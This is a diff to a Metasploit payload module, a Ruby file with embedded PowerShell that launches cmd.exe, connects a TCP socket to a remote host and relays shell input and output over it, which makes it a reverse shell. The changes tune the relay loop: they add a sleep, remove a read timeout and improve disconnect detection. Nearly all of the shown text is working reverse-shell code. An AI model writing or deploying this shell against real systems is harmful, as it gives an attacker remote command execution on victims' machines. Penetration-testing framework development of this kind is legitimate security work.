@@ -10,7 +10,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 1060
+  CachedSize = 1160
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -69,14 +69,14 @@ $p.StartInfo.FileName='cmd.exe';
 $p.StartInfo.RedirectStandardInput=1;
 $p.StartInfo.RedirectStandardOutput=1;
 $p.StartInfo.UseShellExecute=0;
-$p.Start();
+$q=$p.Start();
 $is=$p.StandardInput;
 $os=$p.StandardOutput;
-$osread = $os.BaseStream.ReadAsync($ob, 0, $ob.Length);
+$osread=$os.BaseStream.ReadAsync($ob, 0, $ob.Length);
 $c.connect($a,$b);
 $s=$c.GetStream();
-$s.ReadTimeout = 1000;
 while ($true) {
+    start-sleep -m 100;
     if ($osread.IsCompleted -and $osread.Result -ne 0) {
       $s.Write($ob,0,$osread.Result);
       $s.Flush();
@@ -91,7 +91,7 @@ while ($true) {
           $is.write($str);
       }
     }
-    if ($c.Connected -eq $false) {
+    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {
         break;
     };
     if ($p.ExitCode -ne $null) {
